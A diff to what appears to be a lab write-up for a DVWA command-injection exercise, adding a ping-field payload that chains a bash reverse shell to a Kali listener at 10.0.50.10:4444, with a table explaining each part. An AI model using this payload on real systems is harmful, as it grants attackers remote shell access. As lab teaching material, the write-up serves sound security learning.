@@ -62,6 +62,27 @@ nc -lvnp 4444
 
 </details>
 
+Leave that running, then submit this payload into the DVWA ping field in your browser:
+
+```
+127.0.0.1; bash -c 'bash -i >& /dev/tcp/10.0.50.10/4444 0>&1'
+```
+
+<details>
+<summary>Payload explained</summary>
+
+| Part | What it does |
+|---|---|
+| `127.0.0.1;` | 	Same baseline input as before, chained with a second command |
+| `bash -c '...'` | Runs the quoted string as a bash command |
+| `bash -i` |Spawns an interactive bash shell |
+| `>& /dev/tcp/10.0.50.10/4444` |Redirects both stdout and stderr into a TCP connection back to Kali on port 4444 — this is the actual reverse shell mechanism |
+| `0>&1` |Redirects stdin from the same connection, so you can type commands into it |
+
+</details>
+
+<img width="328" height="74" alt="Screenshot 2026-11-01 101843" src="https://github.com/user-attachments/assets/7cf54349-d155-42e2-ab7b-6f5341900150" />
+
 ## Phase 3 — Enumeration for privilege escalation
 
 With code execution established, the next step is looking for a way to
